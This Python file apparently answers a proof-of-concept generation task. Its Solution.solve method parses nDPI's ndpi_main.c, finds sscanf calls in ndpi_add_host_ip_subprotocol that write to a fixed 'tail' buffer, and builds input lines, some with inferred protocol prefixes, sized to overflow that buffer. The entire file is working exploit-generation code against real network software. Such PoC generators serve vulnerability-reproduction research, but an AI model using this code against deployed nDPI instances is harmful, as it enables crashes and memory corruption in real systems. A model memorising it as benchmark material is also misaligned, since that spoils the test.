import os
import re
import tarfile
import codecs
from typing import List, Optional, Tuple, Dict


def _read_text_file_from_dir(root: str, want_basename: str) -> Optional[str]:
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if fn == want_basename:
                p = os.path.join(dirpath, fn)
                try:
                    with open(p, "rb") as f:
                        return f.read().decode("utf-8", errors="ignore")
                except Exception:
                    pass
    return None


def _read_text_file_from_tar(tar_path: str, want_basename: str) -> Optional[str]:
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            members = tf.getmembers()
            # Prefer src/lib paths
            preferred = []
            others = []
            for m in members:
                if not m.isfile():
                    continue
                bn = os.path.basename(m.name)
                if bn != want_basename:
                    continue
                if "/src/lib/" in m.name.replace("\\", "/") or m.name.replace("\\", "/").endswith("/src/lib/" + want_basename):
                    preferred.append(m)
                else:
                    others.append(m)
            cand = preferred + others
            for m in cand:
                try:
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read()
                    return data.decode("utf-8", errors="ignore")
                except Exception:
                    continue
    except Exception:
        return None
    return None


def _load_source_text(src_path: str, basename: str) -> Optional[str]:
    if os.path.isdir(src_path):
        return _read_text_file_from_dir(src_path, basename)
    if os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
        return _read_text_file_from_tar(src_path, basename)
    return None


def _scan_skip_ws_comments(s: str, i: int) -> int:
    n = len(s)
    while i < n:
        c = s[i]
        if c.isspace():
            i += 1
            continue
        if c == "/" and i + 1 < n:
            c2 = s[i + 1]
            if c2 == "/":
                i += 2
                while i < n and s[i] != "\n":
                    i += 1
                continue
            if c2 == "*":
                i += 2
                while i + 1 < n and not (s[i] == "*" and s[i + 1] == "/"):
                    i += 1
                i = min(n, i + 2)
                continue
        break
    return i


def _match_paren(s: str, i_open: int) -> int:
    n = len(s)
    i = i_open
    if i >= n or s[i] != "(":
        return -1
    depth = 0
    in_str = False
    in_chr = False
    in_lc = False
    in_bc = False
    esc = False
    while i < n:
        c = s[i]
        if in_lc:
            if c == "\n":
                in_lc = False
            i += 1
            continue
        if in_bc:
            if c == "*" and i + 1 < n and s[i + 1] == "/":
                in_bc = False
                i += 2
                continue
            i += 1
            continue
        if in_str:
            if esc:
                esc = False
            else:
                if c == "\\":
                    esc = True
                elif c == '"':
                    in_str = False
            i += 1
            continue
        if in_chr:
            if esc:
                esc = False
            else:
                if c == "\\":
                    esc = True
                elif c == "'":
                    in_chr = False
            i += 1
            continue

        if c == "/" and i + 1 < n:
            c2 = s[i + 1]
            if c2 == "/":
                in_lc = True
                i += 2
                continue
            if c2 == "*":
                in_bc = True
                i += 2
                continue
        if c == '"':
            in_str = True
            i += 1
            continue
        if c == "'":
            in_chr = True
            i += 1
            continue

        if c == "(":
            depth += 1
        elif c == ")":
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return -1


def _match_brace(s: str, i_open: int) -> int:
    n = len(s)
    i = i_open
    if i >= n or s[i] != "{":
        return -1
    depth = 0
    in_str = False
    in_chr = False
    in_lc = False
    in_bc = False
    esc = False
    while i < n:
        c = s[i]
        if in_lc:
            if c == "\n":
                in_lc = False
            i += 1
            continue
        if in_bc:
            if c == "*" and i + 1 < n and s[i + 1] == "/":
                in_bc = False
                i += 2
                continue
            i += 1
            continue
        if in_str:
            if esc:
                esc = False
            else:
                if c == "\\":
                    esc = True
                elif c == '"':
                    in_str = False
            i += 1
            continue
        if in_chr:
            if esc:
                esc = False
            else:
                if c == "\\":
                    esc = True
                elif c == "'":
                    in_chr = False
            i += 1
            continue

        if c == "/" and i + 1 < n:
            c2 = s[i + 1]
            if c2 == "/":
                in_lc = True
                i += 2
                continue
            if c2 == "*":
                in_bc = True
                i += 2
                continue
        if c == '"':
            in_str = True
            i += 1
            continue
        if c == "'":
            in_chr = True
            i += 1
            continue

        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return -1


def _extract_function(text: str, name: str) -> Optional[Tuple[int, int, str]]:
    for m in re.finditer(r"\b" + re.escape(name) + r"\s*\(", text):
        i_name = m.start()
        i_paren = text.find("(", m.end() - 1)
        if i_paren < 0:
            continue
        i_close = _match_paren(text, i_paren)
        if i_close < 0:
            continue
        j = i_close + 1
        j = _scan_skip_ws_comments(text, j)

        # Skip common attributes like __attribute__((...))
        # Also handle possible macro attributes with parentheses.
        for _ in range(8):
            if j < len(text) and text.startswith("__attribute__", j):
                k = text.find("(", j)
                if k < 0:
                    break
                k_close = _match_paren(text, k)
                if k_close < 0:
                    break
                j = k_close + 1
                j = _scan_skip_ws_comments(text, j)
                continue
            break

        if j < len(text) and text[j] == ";":
            continue
        if j >= len(text) or text[j] != "{":
            continue
        i_body_open = j
        i_body_close = _match_brace(text, i_body_open)
        if i_body_close < 0:
            continue
        return i_body_open, i_body_close, text[i_body_open : i_body_close + 1]
    return None


def _extract_c_string_literals(expr: str) -> str:
    lits = re.findall(r'"(?:\\.|[^"\\])*"', expr, flags=re.S)
    if not lits:
        return ""
    out = []
    for lit in lits:
        inner = lit[1:-1]
        inner = inner.replace(r"\?", "?")
        try:
            out.append(codecs.decode(inner, "unicode_escape", errors="strict"))
        except Exception:
            out.append(codecs.decode(inner, "unicode_escape", errors="ignore"))
    return "".join(out)


def _resolve_macro_string(text: str, ident: str) -> str:
    # #define IDENT "..."
    m = re.search(r"(?m)^\s*#\s*define\s+" + re.escape(ident) + r"\s+(.+)$", text)
    if m:
        s = _extract_c_string_literals(m.group(1).strip())
        if s:
            return s
    # static const char IDENT[] = "..."
    m = re.search(r"(?s)\b" + re.escape(ident) + r"\b\s*(?:\[\s*\])?\s*=\s*((?:(?:L)?\"(?:\\.|[^\"\\])*\"\s*)+);", text)
    if m:
        s = _extract_c_string_literals(m.group(1))
        if s:
            return s
    return ""


def _extract_format_string(text: str, expr: str) -> str:
    s = _extract_c_string_literals(expr)
    if s:
        return s
    ident = expr.strip()
    if re.fullmatch(r"[A-Za-z_]\w*", ident):
        s2 = _resolve_macro_string(text, ident)
        if s2:
            return s2
    return ""


def _split_c_args(s: str) -> List[str]:
    args = []
    cur = []
    n = len(s)
    depth_par = 0
    depth_br = 0
    depth_sq = 0
    in_str = False
    in_chr = False
    in_lc = False
    in_bc = False
    esc = False
    i = 0
    while i < n:
        c = s[i]
        if in_lc:
            cur.append(c)
            if c == "\n":
                in_lc = False
            i += 1
            continue
        if in_bc:
            cur.append(c)
            if c == "*" and i + 1 < n and s[i + 1] == "/":
                cur.append("/")
                in_bc = False
                i += 2
                continue
            i += 1
            continue
        if in_str:
            cur.append(c)
            if esc:
                esc = False
            else:
                if c == "\\":
                    esc = True
                elif c == '"':
                    in_str = False
            i += 1
            continue
        if in_chr:
            cur.append(c)
            if esc:
                esc = False
            else:
                if c == "\\":
                    esc = True
                elif c == "'":
                    in_chr = False
            i += 1
            continue

        if c == "/" and i + 1 < n:
            c2 = s[i + 1]
            if c2 == "/":
                in_lc = True
                cur.append(c)
                cur.append(c2)
                i += 2
                continue
            if c2 == "*":
                in_bc = True
                cur.append(c)
                cur.append(c2)
                i += 2
                continue
        if c == '"':
            in_str = True
            cur.append(c)
            i += 1
            continue
        if c == "'":
            in_chr = True
            cur.append(c)
            i += 1
            continue

        if c == "(":
            depth_par += 1
        elif c == ")":
            if depth_par > 0:
                depth_par -= 1
        elif c == "{":
            depth_br += 1
        elif c == "}":
            if depth_br > 0:
                depth_br -= 1
        elif c == "[":
            depth_sq += 1
        elif c == "]":
            if depth_sq > 0:
                depth_sq -= 1

        if c == "," and depth_par == 0 and depth_br == 0 and depth_sq == 0:
            arg = "".join(cur).strip()
            args.append(arg)
            cur = []
            i += 1
            continue

        cur.append(c)
        i += 1
    last = "".join(cur).strip()
    if last:
        args.append(last)
    return args


def _extract_call_args(text: str, i_func: int) -> Optional[Tuple[str, str, List[str], int, int]]:
    # i_func points at start of func name
    m = re.match(r"[A-Za-z_]\w*", text[i_func:])
    if not m:
        return None
    fname = m.group(0)
    i = i_func + len(fname)
    i = _scan_skip_ws_comments(text, i)
    if i >= len(text) or text[i] != "(":
        return None
    i_close = _match_paren(text, i)
    if i_close < 0:
        return None
    inside = text[i + 1 : i_close]
    args = _split_c_args(inside)
    return fname, inside, args, i, i_close


def _find_calls_with_tail(func_body: str, funcname_variants: Tuple[str, ...] = ("sscanf", "__isoc99_sscanf")) -> List[Tuple[str, List[str]]]:
    res = []
    for fname in funcname_variants:
        for m in re.finditer(r"\b" + re.escape(fname) + r"\s*\(", func_body):
            i_func = m.start()
            call = _extract_call_args(func_body, i_func)
            if not call:
                continue
            _, _, args, _, _ = call
            if len(args) < 2:
                continue
            if any(re.search(r"\btail\b", a) for a in args[2:]):
                res.append((fname, args))
    return res


def _parse_scanf_conversions(fmt: str) -> List[Dict]:
    convs = []
    i = 0
    n = len(fmt)
    while i < n:
        if fmt[i] != "%":
            i += 1
            continue
        if i + 1 < n and fmt[i + 1] == "%":
            convs.append({"spec": "%", "assigned": False, "suppressed": False, "width": None, "scanset": None})
            i += 2
            continue
        j = i + 1
        suppressed = False
        if j < n and fmt[j] == "*":
            suppressed = True
            j += 1
        width = None
        k = j
        while k < n and fmt[k].isdigit():
            k += 1
        if k > j:
            try:
                width = int(fmt[j:k])
            except Exception:
                width = None
            j = k
        # length modifiers
        if j + 1 < n and fmt[j:j + 2] in ("hh", "ll"):
            j += 2
        elif j < n and fmt[j] in ("h", "l", "j", "z", "t", "L"):
            j += 1
        if j >= n:
            break
        spec = fmt[j]
        scanset = None
        if spec == "[":
            # parse scanset up to closing ']'
            j += 1
            if j >= n:
                break
            start = j
            # special case if first char is ']' it is included in set
            if fmt[j] == "]":
                j += 1
            while j < n and fmt[j] != "]":
                j += 1
            scanset = fmt[start:j]
            if j < n and fmt[j] == "]":
                j += 1
            spec = "["
            assigned = not suppressed
            convs.append({"spec": spec, "assigned": assigned, "suppressed": suppressed, "width": width, "scanset": scanset})
            i = j
            continue
        assigned = (not suppressed) and (spec != "%")
        convs.append({"spec": spec, "assigned": assigned, "suppressed": suppressed, "width": width, "scanset": None})
        i = j + 1
    return convs


def _scanset_pick_char(scanset: str) -> str:
    # scanset string excludes the outer brackets, includes optional leading '^'
    if scanset is None:
        return "A"
    invert = scanset.startswith("^")
    content = scanset[1:] if invert else scanset

    def expand_one_pass(cont: str) -> List[Tuple[int, int]]:
        ranges = []
        i = 0
        ln = len(cont)
        while i < ln:
            a = cont[i]
            if i + 2 < ln and cont[i + 1] == "-" and cont[i + 2] != "]":
                b = cont[i + 2]
                ranges.append((ord(a), ord(b)))
                i += 3
            else:
                ranges.append((ord(a), ord(a)))
                i += 1
        return ranges

    ranges = expand_one_pass(content)
    if invert:
        # choose a common visible ASCII not excluded
        for ch in ("A", "B", "0", "1", "_", "-", ".", "x"):
            o = ord(ch)
            excluded = False
            for lo, hi in ranges:
                if lo <= o <= hi or hi <= o <= lo:
                    excluded = True
                    break
            if not excluded:
                return ch
        return "Z"
    else:
        # choose preferred characters if included
        for ch in ("A", "a", "0", "1", "_", "-", ".", "x"):
            o = ord(ch)
            ok = False
            for lo, hi in ranges:
                if lo <= o <= hi or hi <= o <= lo:
                    ok = True
                    break
            if ok:
                return ch
        # fall back to first range start
        if ranges:
            lo, hi = ranges[0]
            c = chr(lo if lo <= hi else hi)
            if c.isspace():
                return "A"
            return c
        return "A"


def _generate_input_from_scanf(fmt: str, tail_assigned_index: int, tail_size: int, tail_conv: Dict) -> str:
    out = []
    i = 0
    n = len(fmt)
    assigned_idx = 0
    while i < n:
        c = fmt[i]
        if c.isspace():
            out.append(" ")
            i += 1
            continue
        if c != "%":
            out.append(c)
            i += 1
            continue
        if i + 1 < n and fmt[i + 1] == "%":
            out.append("%")
            i += 2
            continue

        j = i + 1
        suppressed = False
        if j < n and fmt[j] == "*":
            suppressed = True
            j += 1
        width = None
        k = j
        while k < n and fmt[k].isdigit():
            k += 1
        if k > j:
            try:
                width = int(fmt[j:k])
            except Exception:
                width = None
            j = k
        # length
        if j + 1 < n and fmt[j:j + 2] in ("hh", "ll"):
            j += 2
        elif j < n and fmt[j] in ("h", "l", "j", "z", "t", "L"):
            j += 1
        if j >= n:
            break
        spec = fmt[j]

        def add_token(tok: str):
            out.append(tok)

        if spec == "[":
            jj = j + 1
            if jj >= n:
                break
            start = jj
            if fmt[jj] == "]":
                jj += 1
            while jj < n and fmt[jj] != "]":
                jj += 1
            scanset = fmt[start:jj]
            if jj < n and fmt[jj] == "]":
                jj += 1
            if suppressed:
                ch = _scanset_pick_char(scanset)
                ln = 1
                if width and width > 0:
                    ln = 1
                add_token(ch * ln)
            else:
                is_tail = (assigned_idx == tail_assigned_index)
                if is_tail:
                    # Need to read >= tail_size chars to overflow (tail_size + '\0')
                    max_read = width if width is not None else tail_size
                    if max_read < tail_size:
                        max_read = tail_size
                    ln = tail_size
                    if width is not None and width < ln:
                        ln = width
                    ch = _scanset_pick_char(scanset)
                    add_token(ch * ln)
                else:
                    ch = _scanset_pick_char(scanset)
                    add_token(ch)
                assigned_idx += 1
            i = jj
            continue

        if spec in "diuoxX":
            add_token("0")
            if not suppressed:
                assigned_idx += 1
        elif spec in "aAeEfFgG":
            add_token("0")
            if not suppressed:
                assigned_idx += 1
        elif spec in "s":
            if suppressed:
                add_token("a")
            else:
                is_tail = (assigned_idx == tail_assigned_index)
                if is_tail:
                    max_read = width if width is not None else tail_size
                    if max_read < tail_size:
                        max_read = tail_size
                    ln = tail_size
                    if width is not None and width < ln:
                        ln = width
                    add_token("A" * ln)
                else:
                    add_token("a")
                assigned_idx += 1
        elif spec in "c":
            ln = 1
            if width is not None and width > 0:
                ln = width
            add_token("A" * ln)
            if not suppressed:
                assigned_idx += 1
        elif spec in "p":
            add_token("0")
            if not suppressed:
                assigned_idx += 1
        elif spec in "n":
            # doesn't consume input; but still expects arg if not suppressed
            if not suppressed:
                assigned_idx += 1
        else:
            # unknown spec, provide something minimal
            add_token("0")
            if not suppressed:
                assigned_idx += 1

        i = j + 1
    s = "".join(out)
    s = re.sub(r"[ ]{2,}", " ", s)
    return s


def _compute_tail_size(func_body: str) -> int:
    m = re.search(r"\bchar\s+tail\s*\[\s*(\d+)\s*\]", func_body)
    if m:
        try:
            v = int(m.group(1))
            if 2 <= v <= 4096:
                return v
        except Exception:
            pass
    return 64


def _find_ndpi_add_callsites_prefixes(text: str, def_end: int) -> List[Tuple[str, int]]:
    # Returns list of (prefix, offset_used) where offset_used is the numeric index passed in &line[offset] or line+offset if detected
    out = []
    for m in re.finditer(r"\bndpi_add_host_ip_subprotocol\s*\(", text):
        if m.start() < def_end:
            continue
        call = _extract_call_args(text, m.start())
        if not call:
            continue
        _, _, args, _, i_close = call
        if len(args) < 2:
            continue
        # Try to infer base var + offset from 2nd argument
        arg2 = args[1].strip() if len(args) > 1 else ""
        base_var = None
        offset = 0
        mm = re.search(r"&\s*([A-Za-z_]\w*)\s*\[\s*(\d+)\s*\]", arg2)
        if mm:
            base_var = mm.group(1)
            offset = int(mm.group(2))
        else:
            mm = re.search(r"\b([A-Za-z_]\w*)\s*\+\s*(\d+)\b", arg2)
            if mm:
                base_var = mm.group(1)
                offset = int(mm.group(2))
            else:
                mm = re.fullmatch(r"\b([A-Za-z_]\w*)\b", arg2)
                if mm:
                    base_var = mm.group(1)
                    offset = 0

        win_start = max(0, m.start() - 1500)
        win = text[win_start:m.start()]
        # Find strncmp(base_var, "prefix", N)
        if base_var:
            for sm in re.finditer(r"\bstrncmp\s*\(\s*" + re.escape(base_var) + r"\s*,\s*\"([^\"]+)\"\s*,\s*(\d+)\s*\)", win):
                pref = sm.group(1)
                try:
                    n = int(sm.group(2))
                except Exception:
                    continue
                if len(pref) == n and n > 0:
                    out.append((pref, offset))
            for sm in re.finditer(r"\bmemcmp\s*\(\s*" + re.escape(base_var) + r"\s*,\s*\"([^\"]+)\"\s*,\s*(\d+)\s*\)", win):
                pref = sm.group(1)
                try:
                    n = int(sm.group(2))
                except Exception:
                    continue
                if len(pref) == n and n > 0:
                    out.append((pref, offset))
            for sm in re.finditer(r"\bstrcmp\s*\(\s*" + re.escape(base_var) + r"\s*,\s*\"([^\"]+)\"\s*\)", win):
                pref = sm.group(1)
                if pref:
                    out.append((pref, offset))
        else:
            # fallback: any likely prefixes in window
            for sm in re.finditer(r"\"([A-Za-z_]{1,12}[:=])\"", win):
                out.append((sm.group(1), 0))
    # unique, keep smallest offsets and shortest prefixes
    uniq = {}
    for p, off in out:
        if p not in uniq or off < uniq[p]:
            uniq[p] = off
    res = [(p, uniq[p]) for p in uniq]
    res.sort(key=lambda x: (len(x[0]), x[1], x[0]))
    return res


class Solution:
    def solve(self, src_path: str) -> bytes:
        text = _load_source_text(src_path, "ndpi_main.c")
        if not text:
            return b"A\n"

        func = _extract_function(text, "ndpi_add_host_ip_subprotocol")
        if not func:
            # fallback: try to find other file names or just return something
            return b"A\n"
        i_body_open, i_body_close, body = func
        def_end = i_body_close + 1

        tail_size = _compute_tail_size(body)
        calls = _find_calls_with_tail(body, ("sscanf", "__isoc99_sscanf"))
        best_value = None
        best_len = None

        for _, args in calls:
            if len(args) < 3:
                continue
            fmt_expr = args[1]
            fmt = _extract_format_string(text, fmt_expr)
            if not fmt:
                continue

            # Find which argument corresponds to tail
            tail_arg_pos = None
            for idx, a in enumerate(args[2:]):
                if re.search(r"\btail\b", a):
                    tail_arg_pos = idx
                    break
            if tail_arg_pos is None:
                continue

            convs = _parse_scanf_conversions(fmt)
            assigned = [c for c in convs if c.get("assigned")]
            if tail_arg_pos >= len(assigned):
                continue
            tail_conv = assigned[tail_arg_pos]
            w = tail_conv.get("width")
            # Likely vulnerable if unbounded or width >= tail_size
            if w is not None and w <= tail_size - 1:
                # likely already fixed / safe, prefer other candidates
                continue

            value = _generate_input_from_scanf(fmt, tail_arg_pos, tail_size, tail_conv)
            if not value:
                continue
            L = len(value.encode("utf-8", errors="ignore"))
            if best_len is None or L < best_len:
                best_len = L
                best_value = value

        if not best_value:
            # If we couldn't identify a vulnerable call, still try with the first available call
            for _, args in calls:
                if len(args) < 3:
                    continue
                fmt = _extract_format_string(text, args[1])
                if not fmt:
                    continue
                tail_arg_pos = None
                for idx, a in enumerate(args[2:]):
                    if re.search(r"\btail\b", a):
                        tail_arg_pos = idx
                        break
                if tail_arg_pos is None:
                    continue
                value = _generate_input_from_scanf(fmt, tail_arg_pos, tail_size, {})
                if value:
                    best_value = value
                    break

        if not best_value:
            best_value = "A" * max(2, tail_size)

        prefixes = _find_ndpi_add_callsites_prefixes(text, def_end)

        # Prefer prefix usages with positive offset (prefix likely stripped before passing to sscanf)
        chosen_prefix = ""
        if prefixes:
            # Choose a short prefix likely used in strncmp and stripped
            stripped = [p for p in prefixes if p[1] > 0]
            if stripped:
                chosen_prefix = stripped[0][0]
            else:
                chosen_prefix = prefixes[0][0]

        # Build the PoC. Emit both with and without prefix for robustness, but keep small.
        lines = []
        base_line = best_value.strip("\r\n")
        if base_line:
            lines.append(base_line)
        if chosen_prefix:
            lines.append(chosen_prefix + base_line)

        # Also include another short likely prefix if different (max 1 extra)
        for p, _off in prefixes[:3]:
            if p != chosen_prefix and p and len(p) <= 6:
                lines.append(p + base_line)
                break

        # Deduplicate while preserving order
        seen = set()
        uniq_lines = []
        for ln in lines:
            if ln not in seen:
                seen.add(ln)
                uniq_lines.append(ln)

        poc = "\n".join(uniq_lines) + "\n"
        return poc.encode("utf-8", errors="ignore")